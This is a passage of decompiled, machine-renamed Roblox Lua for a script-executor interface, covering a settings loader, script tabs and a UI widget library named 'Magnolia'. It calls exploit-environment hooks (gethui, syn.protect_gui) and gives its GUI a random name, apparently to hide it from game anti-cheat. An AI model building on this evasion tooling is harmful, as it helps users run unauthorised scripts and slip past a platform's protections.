		for v1764, v1765 in pairs(v1630) do
			if (type(v1765) == "table") then
				v1765 = v1309(v1765);
			end
			v1631[v1764] = v1765;
		end
		return v1631;
	end
	local function v1310(v1632)
		local v1633, v1634 = pcall(v1301, v1632);
		if v1633 then
			return v1634;
		end
	end
	local function v1311()
		local v1635;
		local v1636 = v1310(v1303);
		local v1637, v1638 = pcall(v1304.JSONDecode, v1304, v1636);
		if v1637 then
			local v2649 = {codeColors={}};
			v1635 = {};
			v1635.games = ((type(v1638.games) == "table") and v1638.games) or {};
			v1635.scripts = ((type(v1638.scripts) == "table") and v1638.scripts) or {};
			if (v1638.canDebug == nil) then
				v2649.canDebug = v1307;
			else
				v2649.canDebug = v1638.settings.canDebug;
			end
			if (type(v1638.settings) == "table") then
				for v3234, v3235 in next, v1638.settings.codeColors do
					if (typeof(v3235) ~= "table") then
						v2649.codeColors[v3234] = nil;
						continue;
					end
					v3235.R = ((type(v3235.R) == "number") and v3235.R) or 1;
					v3235.G = ((type(v3235.G) == "number") and v3235.G) or 1;
					v3235.B = ((type(v3235.B) == "number") and v3235.B) or 1;
					v2649.codeColors[v3234] = Color3.new(v3235.R, v3235.G, v3235.B);
				end
			else
				v2649.codeColors = v1306;
			end
			v1635.settings = v2649;
			for v2961, v2962 in next, v2649.codeColors do
				if ((typeof(v2962) ~= "Color3") or (v1306[v2961] == nil)) then
					v1635.codeColors[v2961] = nil;
				end
			end
			for v2963, v2964 in next, v1306 do
				if (v2649.codeColors[v2963] == nil) then
					v2649.codeColors[v2963] = v2964;
				end
			end
			for v2965, v2966 in next, v1635.scripts do
				if ((type(v2965) ~= "string") or (type(v2966) ~= "string")) then
					v1635.scripts[v2965] = nil;
				end
			end
		else
			v1635 = v1308();
		end
		return v1635;
	end
	local v1312 = v1311();
	local v1313 = Instance.new("BindableEvent");
	local function v1314()
		local v1639 = v1309(v1312);
		for v1767, v1768 in next, v1639.settings.codeColors do
			v1639.settings.codeColors[v1767] = {R=v1768.R,G=v1768.G,B=v1768.B};
		end
		local v1640, v1641 = pcall(v1304.JSONEncode, v1304, v1639);
		if v1640 then
			v1313:Fire();
			v1302(v1303, v1641);
			if v1305:IsStudio() then
				print(v1641);
			end
		end
	end
	return {data=v1312,save=v1314,codeColors=v1306,configSaved=v1313.Event};
end};
v1159[v0["93"]] = {Closure=function()
	local v1315 = v0["93"];
	local v1316 = 1;
	local v1317 = 0;
	local v1318 = {};
	local v1319 = {};
	local v1320 = v1315.Parent.Main.BodyClipping.Executor.InnerBody.OpenScripts;
	local v1321 = "1";
	local v1322 = v1320["1"]:Clone();
	local v1323 = v1320.Parent.SourceBg.Source.ScrollingFrame.SourceBox;
	local v1324 = v1320["999"];
	v1320["1"]:Destroy();
	local v1325 = Color3.fromRGB(125, 125, 125);
	local v1326 = Color3.fromRGB(221, 221, 221);
	v1323.InputEnded:Connect(function()
		v1319[v1321] = v1323.Text;
	end);
	local function v1327(v1644)
		v1644 = v1644 or "1";
		if (v1644 == v1321) then
			return;
		end
		local v1645 = v1321 and v1318[v1321];
		local v1646 = v1318[v1644];
		if v1645 then
			v1645.Text.TextColor3 = v1325;
		end
		v1646.Text.TextColor3 = v1326;
		v1323.Text = v1319[v1644];
		v1321 = v1646.Name;
	end
	local function v1328()
		local v1651 = (v1316 * v1322.AbsoluteSize.X) + ((v1316 + 1) * 5) + v1324.AbsoluteSize.X;
		v1320.CanvasSize = UDim2.new(0, v1651, 0, 0);
	end
	local function v1329(v1653)
		local v1654 = v1653.Name;
		if (v1654 == "1") then
			v1653.X:Destroy();
		else
			v1653.X.MouseButton1Click:Connect(function()
				if (v1321 == v1654) then
					v1327();
				end
				v1653:Destroy();
				v1318[v1654] = nil;
				v1319[v1654] = nil;
				v1316 -= 1
				v1328();
			end);
		end
		v1653.Text.Text = "Script " .. v1654;
		v1653.Hitbox.MouseButton1Click:Connect(function()
			v1327(v1654);
		end);
	end
	local function v1330()
		v1317 = v1317 + 1;
		v1316 += 1
		local v1656 = v1322:Clone();
		v1656.Name = tostring(v1317);
		v1329(v1656);
		v1656.Parent = v1320;
		v1318[v1656.Name] = v1656;
		v1319[v1656.Name] = "";
		v1328();
		v1327(v1656.Name);
	end
	v1330();
	v1324.Hitbox.MouseButton1Click:Connect(v1330);
	return {getCode=function()
		return v1319[v1321];
	end,setCode=function(v1661)
		v1323.Text = v1661;
	end,clearCurrent=function()
		v1323.Text = "";
	end};
end};
v1159[v0["94"]] = {Closure=function()
	local v1331 = v0["94"];
	local v1332 = v1160(v1331.Parent.utils);
	local v1333;
	local v1334 = "\226\128\139\226\128\139\226\128\139";
	local v1335 = function()
		return true;
	end;
	local v1336 = game:GetService("UserInputService");
	local v1337 = game:GetService("TweenService");
	local v1338 = game:GetService("TeleportService");
	local v1339 = game:GetService("HttpService");
	local v1340 = game:GetService("TextService");
	local v1341 = game:GetService("RunService");
	local v1342 = game:GetService("CoreGui");
	local v1343 = game:GetService("Players");
	local v1344 = game:GetService("Debris");
	local v1345 = game:GetService("Lighting");
	local v1346 = game:GetService("SoundService");
	local v1347 = game:GetService("MarketplaceService");
	local v1348 = v1343.LocalPlayer;
	local v1349 = v1348 and v1348.PlayerGui;
	local v1350 = v1348 and v1348:GetMouse();
	local v1351 = get_hidden_gui or gethui or function()
		local v1664;
		local v1665 = pcall(function()
			v1664 = Instance.new("ScreenGui", v1342);
		end);
		if v1665 then
			v1664:Destroy();
			return v1342;
		else
			return v1349;
		end
	end;
	local v1352 = protect_gui or (syn and syn.protect_gui) or function()
	end;
	local v1353;
	do
		local v1666 = {};
		do
			for v2654 = 48, 57 do
				table.insert(v1666, string.char(v2654));
			end
			for v2655 = 65, 90 do
				table.insert(v1666, string.char(v2655));
			end
			for v2656 = 97, 122 do
				table.insert(v1666, string.char(v2656));
			end
		end
		v1353 = {SearchField=function(v1770, v1771, v1772)
			for v2657 in next, v1770 do
				local v2658 = (v1772 and v1771:lower()) or v1771;
				local v2659 = (v1772 and v2657:lower()) or v2657;
				if v2657:find(v1771) then
					return v2657;
				end
			end
		end,CountTable=function(v1773)
			local v1774 = 0;
			for v2660, v2661 in next, v1773 do
				v1774 = v1774 + 1;
			end
			return v1774;
		end,CloneTable=function(v1775)
			if (type(v1775) == "table") then
				local v2969 = {};
				table.foreach(v1775, function(v3097, v3098)
					v2969[v3097] = v3098;
				end);
				return v2969;
			end
		end,RandomString=function(v1776)
			local v1777 = 0;
			if (not v1776 or (v1776 <= 0)) then
				return "";
			end
			local v1778 = "";
			for v2662 = 1, v1776 do
				math.randomseed(os.time() + v1777);
				v1778 = v1778 .. v1666[math.random(1, #v1666)];
				v1777 = v1777 + 1;
			end
			return v1778;
		end,DarkerColor=function(v1779, v1780)
			local v1781, v1782, v1783 = v1779:ToHSV();
			v1783 = v1783 - v1780;
			if (v1783 < 0) then
				v1783 = 0;
			end
			return Color3.fromHSV(v1781, v1782, v1783);
		end};
	end
	local v1354, v1355, v1356;
	do
		local v1667 = "MagnoliaEnums";
		function v1355()
			return error("can't set value, field is read-only.");
		end
		v1354 = newproxy(true);
		M_EnumsMeta = getmetatable(v1354);
		local v1668 = {};
		local v1669 = {};
		M_EnumsMeta.Data = v1668;
		M_EnumsMeta.__index = function(v1784, v1785)
			local v1786 = v1668[v1785];
			if v1786 then
				return v1786;
			end
			local v1787 = v1353.SearchField(v1668, v1785, true);
			if v1787 then
				return error("Unable to find Enums, " .. v1785 .. ". did you mean, " .. v1787);
			end
			return error("Unable to find Enums, " .. v1785);
		end;
		M_EnumsMeta.__newindex = function(v1788, v1789, v1790)
			if (type(v1790) == "table") then
				for v3100, v3101 in next, v1790 do
					local v3102 = newproxy(true);
					local v3103 = getmetatable(v3102);
					v3103.Path = v1667 .. "." .. v1789 .. "." .. v3100;
					v3103.__index = {Value=v3101,Name=v3100,Type=v1789};
					v3103.__newindex = v1355;
					v3103.__tostring = function()
						return v3103.Path;
					end;
					v1790[v3100] = v3102;
					v1669[v3102] = v1790;
					if (type(v3101) == "table") then
						setmetatable(v3101, {__newindex=v1355});
					end
				end
				setmetatable(v1790, {__newindex=v1355});
				v1668[v1789] = v1790;
			else
				return error("what the frik, how can an Enum not be a table, you bakaro!!");
			end
		end;
		do
			v1354.CornerType = {Sharp="rbxassetid://3457842171",Smooth="rbxassetid://3457843087",Edged="rbxassetid://3457843868",None="",[0]="rbxassetid://3457842171",[1]="rbxassetid://3457843087",[2]="rbxassetid://3457843868",[3]=""};
			v1354.SliderType = {Box=v1354.CornerType.Sharp.Value,Round=v1354.CornerType.Smooth.Value,Diamond=v1354.CornerType.Edged.Value,Custom=v1354.CornerType.None.Value};
			v1354.CheckBoxType = {Sharp=0,Smooth=1,Circular=2,Diamond=3,None=4,[0]=0,[1]=1,[2]=2,[3]=3,[4]=4};
			v1354.FillBoxType = {Sharp="rbxassetid://4049002850",Smooth="rbxassetid://4049766910",Circular="rbxassetid://4049877539",[0]="rbxassetid://4049002850",[1]="rbxassetid://4049766910",[2]="rbxassetid://4049877539"};
			v1354.NotificationType = {Info="rbxassetid://4057220511",Error="rbxassetid://4057319805",Success="rbxassetid://5774307837",Warn="rbxassetid://5849784138",None="",[0]="rbxassetid://4057220511",[1]="rbxassetid://4057319805",[2]="rbxassetid://5774307837",[3]="rbxassetid://5849784138",[4]=""};
			v1354.TabControlType = {Top=0,Right=1,Bottom=2,Left=3,[0]=0,[1]=1,[2]=2,[3]=3};
			v1354.MetroLocation = {TopLeft={AnchorPoint=Vector2.new(0, 0),Position=UDim2.new(0, 0, 0, 0),SizeConstraint="X",ThicknessConstraint="Y",BOffsetX=1,BOffsetY=1},TopCenter={AnchorPoint=Vector2.new(0.5, 0),Position=UDim2.new(0.5, 0, 0, 0),SizeConstraint="X",ThicknessConstraint="Y",BOffsetX=0,BOffsetY=1},TopRight={AnchorPoint=Vector2.new(1, 0),Position=UDim2.new(1, 0, 0, 0),SizeConstraint="X",ThicknessConstraint="Y",BOffsetX=-1,BOffsetY=1},LeftTop={AnchorPoint=Vector2.new(0, 0),Position=UDim2.new(0, 0, 0, 0),SizeConstraint="Y",ThicknessConstraint="X",BOffsetX=1,BOffsetY=1},LeftCenter={AnchorPoint=Vector2.new(0, 0.5),Position=UDim2.new(0, 0, 0.5, 0),SizeConstraint="Y",ThicknessConstraint="X",BOffsetX=1,BOffsetY=0},LeftBottom={AnchorPoint=Vector2.new(0, 1),Position=UDim2.new(0, 0, 1, 0),SizeConstraint="Y",ThicknessConstraint="X",BOffsetX=1,BOffsetY=-1},RightTop={AnchorPoint=Vector2.new(1, 0),Position=UDim2.new(1, 0, 0, 0),SizeConstraint="Y",ThicknessConstraint="X",BOffsetX=-1,BOffsetY=1},RightCenter={AnchorPoint=Vector2.new(1, 0.5),Position=UDim2.new(1, 0, 0.5, 0),SizeConstraint="Y",ThicknessConstraint="X",BOffsetX=-1,BOffsetY=0},RightBottom={AnchorPoint=Vector2.new(1, 1),Position=UDim2.new(1, 0, 1, 0),SizeConstraint="Y",ThicknessConstraint="X",BOffsetX=-1,BOffsetY=-1},BottomLeft={AnchorPoint=Vector2.new(0, 1),Position=UDim2.new(0, 0, 1, 0),SizeConstraint="X",ThicknessConstraint="Y",BOffsetX=1,BOffsetY=-1},BottomCenter={AnchorPoint=Vector2.new(0.5, 1),Position=UDim2.new(0.5, 0, 1, 0),SizeConstraint="X",ThicknessConstraint="Y",BOffsetX=0,BOffsetY=-1},BottomRight={AnchorPoint=Vector2.new(1, 1),Position=UDim2.new(1, 0, 1, 0),SizeConstraint="X",ThicknessConstraint="Y",BOffsetX=-1,BOffsetY=-1}};
		end
		M_EnumsMeta.__newindex = v1355;
		function v1356(v1798)
			if v1669[v1798] then
				return true;
			else
				return false;
			end
		end
	end
	local v1357, v1358, v1359, v1360;
	do
		do
			v1357 = {DimMidnightBlue=Color3.fromRGB(32, 34, 37),MidnightBlue=Color3.fromRGB(47, 49, 54),LightMidnightBlue=Color3.fromRGB(54, 57, 63),WetAsphalt=Color3.fromRGB(44, 62, 80),Asphalt=Color3.fromRGB(52, 73, 94),Midnight=Color3.fromRGB(47, 53, 66),ElectricBlue=Color3.fromRGB(52, 152, 219),Blurple=Color3.fromRGB(72, 52, 212),Exodus=Color3.fromRGB(104, 109, 224),Komaru=Color3.fromRGB(48, 51, 107),DimKomaru=Color3.fromRGB(19, 15, 64),LightExodus=Color3.fromRGB(126, 214, 223),Amythest=Color3.fromRGB(155, 89, 182),Wisteria=Color3.fromRGB(142, 68, 173),Emerald=Color3.fromRGB(46, 204, 113),Carrot=Color3.fromRGB(230, 126, 34),Orange=Color3.fromRGB(243, 156, 18),SunFlower=Color3.fromRGB(241, 196, 15),Ruby=Color3.fromRGB(231, 76, 60),Rose=Color3.fromRGB(192, 57, 43),LightPink=Color3.fromRGB(255, 121, 121),DimPink=Color3.fromRGB(235, 77, 75),Pink=Color3.fromRGB(224, 86, 253),SteelPink=Color3.fromRGB(224, 86, 253),Light=Color3.fromRGB(213, 217, 255),Cloud=Color3.fromRGB(236, 240, 241),Silver=Color3.fromRGB(189, 195, 199),Concrete=Color3.fromRGB(149, 165, 166),Abestos=Color3.fromRGB(127, 140, 141)};
		end
		do
			v1358 = {Map=function(v2663, v2664, v2665, v2666, v2667)
				return (((v2663 - v2664) / (v2665 - v2664)) * (v2667 - v2666)) + v2666;
			end,MapColor=function(v2668, v2669, v2670, v2671, v2672)
				local v2673 = v1358.Map;
				return Color3.new(v2673(v2672, v2670, v2671, v2668.r, v2669.r), v2673(v2672, v2670, v2671, v2668.g, v2669.g), v2673(v2672, v2670, v2671, v2668.b, v2669.b));
			end,Round=function(v2674)
				local v2675 = math.floor(v2674);
				local v2676 = math.floor(v2674) + 1;
				local v2677 = -(v2675 - v2674);
				local v2678 = v2676 - v2674;
				if (v2678 > v2677) then
					return v2675;
				else
					return v2676;
				end
			end,ZigZag=function(v2679)
				return math.acos(math.cos(v2679 * math.pi)) / math.pi;
			end};
			v1359 = v1358.Map;
		end
		do
			v1360 = {CornerSize=6,CornerType=v1354.CornerType.Smooth,BackgroundColor=v1357.MidnightBlue,BackgroundTransparency=0,BorderSize=0,BorderColor=Color3.new(0, 0, 0),BorderTransparency=1,TextColor=v1357.Silver,TextTransparency=0,Font=Enum.Font.Legacy,TextStrokeColor=v1357.Abestos,TextStrokeTransparency=1,TextXAlignment=Enum.TextXAlignment.Center,TextYAlignment=Enum.TextYAlignment.Center,PlaceholderColor=v1357.Silver,ZIndex=1,SecondaryColor=v1357.DimMidnightBlue,HighlightColor=v1357.ElectricBlue,MetroStyle=true};
		end
	end
	local v1361 = {};
	local v1362, v1363, v1364, v1365, v1366, v1367, v1368;
	do
		local v1673 = {};
		local v1674 = {};
		local v1675 = {};
		local v1676 = {};
		v1367 = v1673;
		local v1677 = {AbsolutePosition="__Base2D",AbsoluteRotation="__Base2D",AbsoluteSize="__Base2D",Active="__Base2D",AnchorPoint="__Base2D",ClipsDescendants="__Base2D",LayoutOrder="__Base2D",Position="__Base2D",Rotation="__Base2D",Size="__Base2D",SizeConstraint="__Base2D",Visible="__Base2D",ZIndex="__Base2D",Parent="__Base2D",Name="__Base2D",Font="__TextRender",LineHeight="__TextRender",LocalizedText="__TextRender",Text="__TextRender",TextBounds="__TextRender",TextColor3="__TextRender",TextFits="__TextRender",TextScaled="__TextRender",TextSize="__TextRender",TextStrokeColor3="__TextRender",TextStrokeTransparency="__TextRender",TextTransparency="__TextRender",TextTruncate="__TextRender",TextWrapped="__TextRender",TextXAlignment="__TextRender",TextYAlignment="__TextRender",CornerRadius="__UICorner",HoverImage="__ImageRender",Image="__ImageRender",ImageColor3="__ImageRender",ImageRectOffset="__ImageRender",ImageRectSize="__ImageRender",ImageTransparency="__ImageRender",IsLoaded="__ImageRender",PressedImage="__ImageRender",ScaleType="__ImageRender",SliceCenter="__ImageRender",SliceScale="__ImageRender",TileSize="__ImageRender",IsFocused="__TextBox",PlaceholderColor3="__TextBox",PlaceholderText="__TextBox",ClearTextOnFocus="__TextBox",TextEditable="__TextBox",CursorPosition="__TextBox",SelectionStart="__TextBox",Selectable="__TextBox",Color="__Background",BackgroundColor="__Background",BackgroundColor3="__Background",BackgroundTransparency="__Background",Transparency="__Background",Type="__Background",CornerType="__Background",CornerSize="__Background",TopLeft="__Background",TopBorder="__Background",TopRight="__Background",LeftBorder="__Background",RightBorder="__Background",BottomLeft="__Background",BottomBorder="__Background",BottomRight="__Background",BorderSizePixel="__Background",BorderSize="__Background",BorderColor3="__Background",BorderColor="__Background",BorderTransparency="__Background",CreateBorder="__Background",TweenPosition="__Base2D",TweennSize="__Base2D",TweenSizeAndPosition="__Base2D",SetTextFromInput="__CHitbox",CaptureFocus="__TextBox",ReleaseFocus="__TextBox",MouseButton1Click="__CHitbox",MouseButton2Click="__CHitbox",MouseButton1Down="__CHitbox",MouseButton2Down="__CHitbox",MouseButton1Up="__CHitbox",MouseButton2Up="__CHitbox",MouseEnter="__CHitbox",MouseLeave="__CHitbox",MouseMoved="__CHitbox",MouseWheelBackward="__Base2D",MouseWheelForward="__Base2D",InputBegan="__CHitbox",InputEnded="__CHitbox",InputChanged="__CHitbox",Focused="__TextBox",FocusLost="__TextBox"};
		function v1365(v1800)
			if (typeof(v1800) == "Instance") then
				return v1800;
			else
				local v2971 = v1674[v1800];
				return v2971 and v2971.__Instance;
			end
		end
		function v1366()
			local v1801 = v1351();
			local v1802 = Instance.new("ScreenGui");
			if v1352 then
				v1352(v1802);
			end
			v1802.Name = v1353.RandomString(math.random(5, 10));
			v1802.ZIndexBehavior = Enum.ZIndexBehavior.Sibling;
			v1802.Parent = v1801;
			return v1802;
		end
		do
			v1368 = {Destroy=function(v2680)
				local v2681 = v1333(v2680);
				v1361[v2680] = true;
				for v2972, v2973 in next, v2681 do
					if (v2973 ~= v2680) then
						if (typeof(v2973) == "Instance") then
							if (v2973.ClassName == "BindableEvent") then
								v2973:Destroy();
							end
						elseif ((type(v2973) == "userdata") and v1674[v2973] and (v1361[v2973] == nil)) then
							v2973:Destroy();
						end
					end
				end
				v2681.__Instance:Destroy();
			end,GetMeta=function(v2683)
				return v1674[v2683];
			end};
		end
		v1333 = v1368.GetMeta;
		local v1679 = function(v1807, v1808, v1809)
			if v1807 then
				local v2974 = v1807:byte(1, 1);
				local v2975 = v1807:byte(2, 2);
				local v2976 = v1807:sub(4, -1);
				if ((v1809 == nil) and (v2975 == 1)) then
					return v1809;
				end
				if (v2974 == 0) then
					if (v1356(v1809) and (v1809.Type == v2976)) then
						return v1809;
					else
						return false, "Invalid MagnoliaEnum value. Expected " .. v2976 .. ".";
					end
				elseif (v2974 == 1) then
					local v3296 = v1365(v1809);
					if (typeof(v3296) == "Instance") then
						return v3296;
					else
						return false, "Invalid Base Instance for " .. v1808 .. ". Got " .. typeof(v1809) .. ".";
					end
				elseif (v2974 == 2) then
					return v1809;
				elseif ((v2974 == 3) or (v2974 == 4)) then
					local v3317 = ((v2974 == 3) and type) or typeof;
					if (v3317(v1809) == v2976) then
						return v1809;
					else
						return false, "Invalid type for " .. v1808 .. ". " .. v2976 .. " expected, got " .. typeof(v1809) .. ".";
					end
				end
			end
		end;
		function v1362(v1810, v1811, v1812, v1813, v1814, v1815)
			if v1673[v1810] then
				warn("You are creating a Magnolia class withe the existing ClassName, " .. v1810 .. ". Your new class will replace the old one.");
			end
			local v1816 = {};
			v1816.Fields = v1811;
			v1816.Routing = v1812;
			v1816.Constructor = v1813;
			v1816.ClassName = v1810;
			v1816.Methods = v1815;
			local v1822 = setmetatable({}, {__index=function()
				return function()
				end;
			end});
			v1814(v1822);
			v1816.Draw = v1822;
			for v2684, v2685 in next, v1812 do
				if (not v1811[v2685] and not v1815[v2685]) then
					v1812[v2684] = nil;
					error("Magnolia Create Class, figured out that you defined a route " .. v2684 .. ", that point to an inexistent field " .. v2685);
				end
			end
			for v2686, v2687 in next, v1368 do
				if not v1811[v2686] then
					v1811[v2686] = {"\3\0\1function",v2687};
				end
			end
			for v2688, v2689 in next, v1815 do
				v1811[v2688] = {"\3\0\1function",v2689};
			end
			if not v1811['ClassName'] then
				v1811['ClassName'] = {"\3\0\1string",v1810};
			end
			v1673[v1810] = v1816;
			return v1816;
		end
		M_Meta = {__index=function(v1825, v1826)
			local v1827 = v1674[v1825];
			local v1828 = v1827.__ClassData;
			local v1829 = v1827.__Fields;
			if v1828.Fields[v1826] then
				return v1829[v1826];
			end
			local v1830 = v1828.Routing[v1826];
			if v1830 then
				return v1829[v1830];
			end
			local v1831 = v1677[v1826];
			if (v1831 and v1827[v1831]) then
				return v1827[v1831][v1826];
			end
			local v1832 = v1827.__Instance;
			if (v1832 and v1832:FindFirstChild(v1826)) then
				return v1832[v1826];
			end
			return error("Unable to index MagnoliaInstance with, \'" .. v1826 .. "\'");
		end,__newindex=function(v1833, v1834, v1835)
			local v1836 = v1674[v1833];
			local v1837 = v1836.__ClassData;
			local v1838 = v1836.__Fields;
			local v1834 = v1837.Routing[v1834] or v1834;
			local v1839 = v1837.Fields[v1834];
			if v1839 then
				local v2978 = v1839[1]:byte(3, 3);
				if (v2978 == 1) then
					return error(v1834 .. " is read-only.");
				end
				local v2979, v2980 = v1679(v1839[1], v1834, v1835);
				if v2980 then
					return error(v2980);
				end
				if (v1838[v1834] ~= v2979) then
					local v3243 = v1838[v1834];
					v1838[v1834] = v2979;
					v1837.Draw[v1834](v1836, v1838, v3243, v1833);
				end
				v1836.__ChangeSignal:Fire(v1834, v2979);
				return;
			else
				local v2981 = v1677[v1834];
				if (v2981 and (typeof(v1836[v2981]) == "Instance")) then
					v1836[v2981][v1834] = v1835;
					return;
				end
			end
			return error("Unable to newindex field " .. v1834);
		end,__tostring=function(v1840)
			local v1841 = v1674[v1840];
			return v1841.tostring or v1841.__Fields.Name or v1841.__ClassData.ClassName;
		end,__metatable="Can you pleawse don\'t cwash magnowia OwO",__redraw=function(v1842)
			local v1843 = v1333(v1842);
			local v1844 = v1843.__Fields;
			local v1845 = v1843.__ClassData;
			local v1846 = {};
			table.foreach(v1845.Draw, function(v2691, v2692)
				if v1846[v2692] then
					return;
				end
				v1846[v2692] = v2691;
				v2692(v1843, v1844, nil, v1842);
			end);
		end};
		local v1680 = function(v1847)
			local v1848 = newproxy(true);
			local v1849 = getmetatable(v1848);
			local v1850 = Instance.new("BindableEvent");
			local v1851 = {};
			v1850.Name = "MagnoliaChangeSignal";
			v1849.__index = M_Meta.__index;
			v1849.__newindex = M_Meta.__newindex;
			v1849.__tostring = M_Meta.__tostring;
			v1849.__metatable = M_Meta.__metatable;
			v1849.__ClassData = v1847;
			v1849.__Proxy = v1848;
			v1849.__Fields = v1851;
			v1849.__ChangeSignal = v1850;
			v1849.Draw = v1847.Draw;
			v1847.Fields.Redraw = {"\3\0\1function",M_Meta.__redraw};
			for v2694, v2695 in next, v1847.Fields do
				local v2696 = v2695[1]:sub(4, -1);
				if (v2696 == "Event") then
					local v3112 = Instance.new("BindableEvent");
					v3112.Name = v2694;
					v1849[v2694] = v3112;
					v1851[v2694] = v3112.Event;
					v2695[1]:gsub("Event", "Instance");
				else
					v1851[v2694] = v2695[2];
				end
			end
			v1674[v1848] = v1849;
			return v1848, v1849;
		end;
		function v1363(v1869, ...)
			local v1870 = v1673[v1869];
			if v1870 then
				local v2982 = v1870.Constructor;
				local v2983, v2984 = v1680(v1870);
				v2982(v2983, ...);
				if v2984.__Instance then
					v1675[v2983] = v2984.__Instance;
				end
				return v2983;
			else
				local v2985 = v1353.SearchField(v1673, v1869, true);
				if v2985 then
					return error("unable to find magnolia class, " .. v1869 .. ". Did you mean " .. v2985 .. "?");
				end
				return error("unable to find magnolia class, " .. v1869 .. ".");
			end
		end
		function v1364(v1871)
			if v1674[v1871] then
				return true;
			else
				return false;
			end
		end
	end
	local v1369;
	do
		v1362("TextBox", {Value={"\3\0\1string",""},BackgroundColor3={"\4\0\0Color3",v1360.BackgroundColor},AutoTextBoxColor={"\3\0\0boolean",true},FocusedColor3={"\4\0\0Color3",v1360.SecondaryColor},PasswordChar={"\3\0\0string",""},TextTransparency={"\3\0\0number",v1360.TextTransparency},IsFocused={"\3\0\1boolean",false},RoundRadius={"\3\0\0number",0.042},MetroStyle={"\3\0\0boolean",true},MetroDirection={"\4\0\0UDim2"},MetroStartColor3={"\4\0\0Color3",v1360.HighlightColor},MetroEndColor3={"\4\0\0Color3",v1360.HighlightColor},MetroStartTransparency={"\3\0\0number",0},MetroEndTransparency={"\3\0\0number",0},MetroStartSize={"\3\0\0number",3},MetroEndSize={"\3\0\0number",3},MetroTweenInfo={"\4\0\0TweenInfo"},Writing={"\4\0\1Event"}}, {ValueChanged="Writing",MetroStartColor="MetroStartColor3",MetroEndColor="MetroEndColor3"}, function(v1872, v1873)
			local v1874 = v1333(v1872);
			local v1875 = v1874.__Fields;
			v1875.MetroDirection = UDim2.new(0, 1, 1, 1);
			v1875.MetroTweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.Out);
			local v1878 = Instance.new("Frame", v1365(v1873));
			local v1879 = Instance.new("TextBox", v1878);
			local v1880 = Instance.new("TextLabel", v1878);
			local v1881 = Instance.new("ImageLabel", v1878);
			v1878.BackgroundTransparency = 1;
			v1878.BorderSizePixel = 0;
			v1878.Name = "MagnoliaTextBox";
			v1878.Size = UDim2.new(0, 105, 0, 25);
			v1878.ZIndex = v1360.ZIndex;
			v1881.Name = v1334 .. "Background";
			v1881.Image = "rbxassetid://3570695787";
			v1881.ScaleType = Enum.ScaleType.Slice;
			v1881.Size = UDim2.new(1, 0, 1, 0);
			v1881.SliceCenter = Rect.new(100, 100, 100, 100);
			v1881.Position = UDim2.new(0.5, 0, 0, 0);
			v1881.AnchorPoint = Vector2.new(0.5, 0);
			v1881.BackgroundTransparency = 1;
			v1881.ZIndex = v1878.ZIndex;
			local v1898 = v1881:Clone();
			v1898.Name = v1334 .. "Underline";
			v1898.Parent = v1878;
			v1898.AnchorPoint = Vector2.new(0.5, 1);
			v1898.Position = UDim2.new(0.5, 0, 1, 0);
			v1898.Size = UDim2.new(0, 0, 0.12, 0);
			v1898.Rotation = 180;
			v1898.ImageRectSize = Vector2.new(200, 120);
			v1879.Name = v1334 .. "TextRender";
			v1879.Text = v1875.Value;
			v1879.BackgroundTransparency = 1;
			v1879.BorderSizePixel = 0;
			v1879.Size = UDim2.new(1, 0, 1, 0);
			v1879.Position = UDim2.new(0.5, 0, 0.5, 0);
			v1879.AnchorPoint = Vector2.new(0.5, 0.5);
			v1879.ZIndex = 10;
			v1879.TextColor3 = v1360.TextColor;
			v1879.TextTransparency = v1360.TextTransparency;
			v1879.Font = v1360.Font;
			v1879.TextStrokeColor3 = v1360.TextStrokeColor;
			v1879.TextStrokeTransparency = v1360.TextStrokeTransparency;
			v1879.TextXAlignment = v1360.TextXAlignment;
			v1879.TextYAlignment = v1360.TextYAlignment;
			v1879.PlaceholderColor3 = v1360.PlaceholderColor;
			v1880.Name = v1334 .. "PasswordChar";
			v1880.Text = "";
			v1880.BackgroundTransparency = 1;
			v1880.BorderSizePixel = 0;
			v1880.Size = UDim2.new(1, 0, 1, 0);
			v1880.Position = UDim2.new(0.5, 0, 0.5, 0);
			v1880.AnchorPoint = Vector2.new(0.5, 0.5);
			v1880.TextColor3 = v1360.TextColor;
			v1880.TextTransparency = v1360.TextTransparency;
			v1880.Font = v1360.Font;
			v1880.TextStrokeColor3 = v1360.TextStrokeColor;
			v1880.TextStrokeTransparency = v1360.TextStrokeTransparency;
			v1880.TextXAlignment = v1360.TextXAlignment;
			v1880.TextYAlignment = v1360.TextYAlignment;
			v1879.Focused:Connect(function()
				v1875.IsFocused = true;
				v1898.ImageColor3 = v1875.MetroStartColor3;
				v1337:Create(v1898, v1875.MetroTweenInfo, {ImageColor3=v1875.MetroEndColor3,Size=UDim2.new(1, 0, v1898.Size.Y.Scale, 0)}):Play();
				if v1875.AutoTextBoxColor then
					v1337:Create(v1879, v1875.MetroTweenInfo, {TextColor3=v1875.MetroEndColor3}):Play();
				end
			end);
			v1879.FocusLost:Connect(function()
				v1875.IsFocused = false;
				v1898.ImageColor3 = v1875.MetroEndColor3;
				v1337:Create(v1898, v1875.MetroTweenInfo, {ImageColor3=v1875.MetroStartColor3,Size=UDim2.new(0, 0, v1898.Size.Y.Scale, 0)}):Play();
				if v1875.AutoTextBoxColor then
					v1337:Create(v1879, v1875.MetroTweenInfo, {TextColor3=v1875.MetroStartColor3}):Play();
				end
			end);
			v1879.Changed:Connect(function(v2703)
				if (v1875.IsFocused and (v2703 == "Text")) then
					v1875.Value = v1879.Text;
					v1874.Writing:Fire(v1879.Text);
				end
			end);
			v1874.__Instance = v1878;
			v1874.__Base2D = v1878;
			v1874.__Background = v1881;
			v1874.__TextRender = v1879;
			v1874.__TextBox = v1879;
			v1874.__ImageRender = v1881;
			v1874.Underline = v1898;
			v1874.PasswordChar = v1880;
			v1875.Redraw(v1872);
		end, function(v1953)
			v1953['BackgroundColor3'] = function(v2704, v2705)
				if (not v2705.AutoTextBoxColor or not v2704.__TextBox:IsFocused()) then
					v2704.__Background.ImageColor3 = v2705.BackgroundColor3;
				end
			end;
			v1953['RoundRadius'] = function(v2706, v2707)
				local v2707 = v2706.__Fields;
				v2706.__Background.SliceScale = v2707.RoundRadius;
				v2706.Underline.SliceScale = v2707.RoundRadius;
			end;
		end, {});
